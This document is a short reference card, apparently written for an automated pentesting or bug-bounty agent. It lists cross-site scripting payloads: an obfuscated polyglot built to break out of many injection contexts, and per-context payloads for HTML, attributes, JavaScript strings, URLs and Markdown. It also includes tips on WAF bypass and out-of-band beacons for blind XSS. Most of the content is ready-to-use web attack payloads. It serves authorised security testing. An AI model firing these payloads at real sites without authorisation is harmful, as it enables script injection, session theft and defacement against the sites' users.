---
name: payloads-xss-polyglots
description: >
  Context-breaking XSS polyglots and per-context payloads that fire across HTML/attribute/JS/
  URL sinks in one shot. Load when confirming XSS fast, unsure of the injection context, or a
  single test payload should cover many contexts. Signals: reflected input, XSS triage, "polyglot".
domain: payloads
type: reference
stability: learning
modes: [pentest, bugbounty]
severity: info
cwe: [CWE-79]
schema_version: 1
---

# XSS polyglots & per-context payloads

## When it applies
You want one payload that reveals reflection/execution regardless of where it lands, then a
context-specific finisher once you know the spot. Pairs with `web-xss`.

## Why it works
A polyglot is crafted to be syntactically valid (and break out) in multiple contexts at once —
HTML body, attribute, JS string, comment — so a single injection surfaces the vulnerable context.

## Payloads
**Polyglot (fires broadly):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Per context (once you know where you landed):**
- HTML body: `<svg onload=alert(document.domain)>`
- Attribute (break out first): `"><svg onload=alert(document.domain)>` or `" autofocus onfocus=alert() x="`
- JS string: `';alert(document.domain)//` or `</script><svg onload=alert()>`
- URL/href: `javascript:alert(document.domain)`
- Markdown: `[x](javascript:alert(1))` / `![x](onerror)`
- Attribute w/o quotes: `x onmouseover=alert() `

**WAF-resistant variants:** see `payloads-waf-bypass` (event/tag variety, encoding, no-parens).

## Gotchas
- Prove real impact with `document.domain` (right origin), not sandboxed `alert(1)`.
- Blind/stored XSS: use an OOB payload that beacons to your collaborator instead of `alert`.
- If it reflects encoded, you have the right context but wrong breakout — adjust, don't add tags.

## References
PortSwigger XSS cheat sheet; 0xsobky "Unleashing an Ultimate XSS Polyglot".
